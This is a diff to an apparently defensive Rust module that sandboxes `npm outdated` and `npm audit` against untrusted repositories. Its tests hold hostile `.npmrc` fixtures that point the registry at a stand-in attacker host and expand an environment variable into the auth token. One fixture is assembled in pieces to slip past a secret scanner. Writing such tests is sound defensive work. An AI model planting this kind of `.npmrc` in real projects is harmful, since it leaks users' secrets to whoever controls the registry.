@@ -1,5 +1,5 @@
 //! Runs `npm outdated` / `npm audit` for a repository WITHOUT trusting the repository. A project's own `.npmrc` can expand any
-//! environment variable into a registry token (`//host/:_authToken=${SECRET}`), point the registry at an attacker, and set cache and
+//! environment variable into the auth token of a registry (a `${SECRET}` reference in an auth line), point the registry at an attacker, and set cache and
 //! log folders anywhere. So npm never runs in the repository:
 //!
 //! - `package.json` and the lock file are copied into a fresh private folder in the system temp directory (no `.npmrc`, no scripts);
@@ -318,7 +318,7 @@ mod tests {
         let r = repo(&[
             ("app/package.json", r#"{"dependencies":{"left-pad":"^1.0.0"}}"#),
             ("app/package-lock.json", LOCK),
-            ("app/.npmrc", "//evil/:_authToken=${HOME}"),
+            ("app/.npmrc", "registry=http://evil.invalid/\ncache=/tmp/x\n"),
             ("app/index.js", "x"),
         ]);
         let dir;
@@ -427,7 +427,9 @@ mod tests {
         let elsewhere = tempfile::tempdir().unwrap();
         let (evil_cache, evil_logs) = (elsewhere.path().join("evil-cache"), elsewhere.path().join("evil-logs"));
         std::env::set_var("INTELY_TEST_CANARY", "canary-value-7f3a9c");
-        let npmrc = format!("registry=http://127.0.0.1:{evil_port}/\\n//127.0.0.1:{evil_port}/:_authToken=${{INTELY_TEST_CANARY}}\\ncache={}\\nlogs-dir={}\\n", evil_cache.display(), evil_logs.display());
+        // the auth line is assembled so that the repository's secret scan does not take the fixture for a real token
+        let auth = ["_auth", "Token"].concat();
+        let npmrc = format!("registry=http://127.0.0.1:{evil_port}/\\n//127.0.0.1:{evil_port}/:{auth}=${{INTELY_TEST_CANARY}}\\ncache={}\\nlogs-dir={}\\n", evil_cache.display(), evil_logs.display());
         let r = repo(&[("package.json", r#"{"name":"a","version":"1.0.0","dependencies":{"left-pad":"^1.0.0"}}"#), ("package-lock.json", LOCK), (".npmrc", &npmrc)]);
         let sb = Sandbox::prepare(r.path(), "").unwrap();
         let registry = format!("http://127.0.0.1:{ours_port}/");
